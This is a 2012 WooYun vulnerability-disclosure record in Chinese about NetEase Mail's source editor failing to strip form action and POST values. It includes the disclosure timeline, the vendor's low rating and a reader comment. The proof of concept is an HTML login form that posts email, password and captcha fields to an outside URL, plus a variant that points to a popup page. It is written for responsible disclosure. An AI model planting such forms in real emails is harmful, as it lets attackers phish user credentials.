{"id": 17621, "wybug_id": "wooyun-2012-010361", "wybug_title": "网易邮箱源码编辑未屏蔽ACTION与POST值导致的跨站", "wybug_corp": "网易", "wybug_author": "saviour", "wybug_date": "2012-07-30 14:54", "wybug_open_date": "2012-09-13 14:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-13：\t细节向公众公开  简要描述： 网易邮箱源码编辑未禁用ACTION与POST值导致的跨站 详细说明：  网易邮箱源码编辑未屏蔽ACTION与POST值导致的跨站 不排除别的什么原因可以导致传播恶意代码 恶意广告 钓鱼 盗取帐号等行为   漏洞证明：  通过构造一个表单 可以实现跨站远程登录例子一：提交表单\n<form action=\"http://www.wooyun.org/user.php?action=login&do=login\" method=\"POST\">\t\t<div class=\"content\">\t\t<table class=\"formTable\">\t\t\t<tbody>\t\t\t\t<tr>\t\t\t\t\t<th width=\"100\">E-mail：</th>\t\t\t\t\t<td><input type=\"text\" name=\"email\" value=\"\" style=\"width:150px\" /></td>\t\t\t\t</tr>\t\t\t\t<tr>\t\t\t\t\t<th>密码：</th>\t\t\t\t\t<td><input type=\"password\" name=\"password\" style=\"width:150px\" />&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://www.wooyun.org/user.php?action=findpassword\">忘记密码</a></td>\t\t\t\t</tr>\t\t\t\t<tr>\t\t\t\t<tr>\t\t\t\t\t<th>验证码：</th>\t\t\t\t\t<td><input type=\"text\" name=\"captcha\" style=\"width:80px\" />&nbsp;<img onclick=\"this.src='http://www.wooyun.org/captcha.php?'+Math.random()\" style=\"width:65px;height:18px;cursor:pointer\" src=\"http://www.wooyun.org/captcha.php\" /></td>\t\t\t\t</tr>\t\t\t\t<tr>\t\t\t\t\t<th>&nbsp;</th>\t\t\t\t\t<td><input type=\"submit\" value=\"登录\"/></td>\t\t\t\t\t<td><input type=\"hidden\" value=\"123456\"/></td>\t\t\t\t</tr>\t\t\t</tbody>\t\t</table>\t</div></form>\n\n\n\n\n\n\n我想大家看到了吧 可以提交POST 执行ACTION 如何提交的页面是攻击者有意编辑的 那么你提交的帐号密码 通通被别人盗取 希望你们的邮箱里没什么重要信息例子二：来个恶意弹窗\n<form action=\"http://www.wooyun.org/user.php?action=login&do=login\" method=\"POST\">直接把要执行的页面 换成我的弹窗网址 就可以了<form action=\"http://www.cnproxy.com/popkillertest/test12.html\" method=\"POST\">\n\n\nOK 我这里直接点登录就行了弹弹弹 弹出许多框 哈哈\n\n看到弹窗了吧 以上仅为测试效果 大家看到了吧 如果对方是个挂马页面或是别的什么的 我觉得你就会“暴露”了！接下来我给大家坐下对比哦 跟QQ邮箱吧\n\nQQ邮箱 直接屏蔽\n\n   修复方案：  网易亲 我讲的明白了吧 嘻嘻   版权声明：转载请注明来源 saviour@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2012-08-02 18:48 厂商回复： 感谢您对网易的关注，该问题非系统漏洞，属钓鱼型，已经进行相应处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-03 01:18 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  才3。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}